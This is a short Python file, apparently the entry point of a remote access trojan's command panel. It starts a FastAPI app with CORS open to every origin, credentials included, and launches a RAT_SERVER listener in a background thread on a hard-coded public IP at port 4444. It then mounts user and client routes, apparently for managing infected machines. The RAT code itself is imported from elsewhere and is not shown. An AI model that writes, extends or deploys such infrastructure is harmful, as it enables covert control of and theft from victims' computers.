from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from routes import user, clients
from host.server import RAT_SERVER
import threading

app = FastAPI()

origins = ["*"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"])


def start_rat_server():
    rat = RAT_SERVER('81.167.27.70', 4444)
    rat.build_connection()


# Create a new thread to run the RAT_SERVER
rat_thread = threading.Thread(target=start_rat_server)
rat_thread.start()

app.include_router(user.app, prefix="/api/v1")
app.include_router(clients.app, prefix="/api/v1")
